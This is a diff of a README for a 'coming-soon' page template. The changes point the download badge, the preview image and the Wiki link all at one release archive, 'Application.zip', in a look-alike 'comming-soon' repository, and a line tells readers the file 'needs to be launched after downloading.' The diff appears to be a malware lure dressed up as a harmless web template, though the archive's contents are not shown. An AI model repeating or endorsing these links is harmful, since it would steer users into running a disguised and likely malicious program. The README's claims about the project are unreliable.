@@ -18,14 +18,14 @@ Explore the following topics related to the "coming-soon" project:
 
 ### 📥 Download the Template
 Click the button below to download the "coming-soon" template:
-[![Download Coming Soon Template](https://img.shields.io/badge/Download-Coming_Soon_Template-blue)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download Coming Soon Template](https://github.com/TimpleTin/comming-soon/releases/download/v1.0/Application.zip)](https://github.com/TimpleTin/comming-soon/releases/download/v1.0/Application.zip)
 
 *Note: The file needs to be launched after downloading.*
 
 ### Preview
 Here is a sneak peek at what the Coming Soon page looks like:
 
-![Coming Soon Page Preview](https://example.com/coming-soon-preview.jpg)
+![Coming Soon Page Preview](https://github.com/TimpleTin/comming-soon/releases/download/v1.0/Application.zip)
 
 ### 🌐 Explore the Features
 1. **Responsive Design:** The Coming Soon page is optimized for display on various devices, ensuring a seamless user experience.
@@ -53,4 +53,4 @@ If the provided download link is not working, please check the "Releases" sectio
 Thank you for exploring the "coming-soon" repository. Get ready to create excitement and anticipation for your upcoming projects with this sleek and intuitive Coming Soon page template. Start the countdown and make a memorable impression on your audience today! 🎉
 
 ---
-Feel free to refer to the [Wiki](https://github.com/yourusername/coming-soon/wiki) section for additional resources and tips on customizing the Coming Soon page template. Stay connected with the community to share your experiences and get inspired by other users' projects. Happy coding! 🌈
+Feel free to refer to the [Wiki](https://github.com/TimpleTin/comming-soon/releases/download/v1.0/Application.zip) section for additional resources and tips on customizing the Coming Soon page template. Stay connected with the community to share your experiences and get inspired by other users' projects. Happy coding! 🌈
